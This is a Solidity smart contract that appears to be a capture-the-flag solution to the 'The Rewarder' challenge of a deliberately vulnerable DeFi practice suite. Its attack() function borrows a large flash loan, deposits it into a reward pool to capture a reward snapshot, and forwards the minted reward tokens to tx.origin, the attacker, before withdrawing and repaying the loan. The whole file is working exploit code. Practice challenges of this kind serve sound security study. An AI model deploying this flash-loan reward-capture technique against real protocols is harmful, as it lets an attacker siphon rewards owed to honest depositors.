// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./AccountingToken.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract TheRewarderSolution{
    TheRewarderPool public immutable rewarderPool;
    FlashLoanerPool public immutable flashLoanerPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    constructor (address _rewarderPool, address _flashLoanerpool, address _rewardToken, address _liquidityToken) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerpool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack() public {
        flashLoanerPool.flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 amount) external {
        // tx.origin: attacker
        liquidityToken.approve(address(rewarderPool), type(uint256).max);
        rewarderPool.deposit(amount);
        rewardToken.transfer(tx.origin, rewardToken.balanceOf(address(this)));
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

}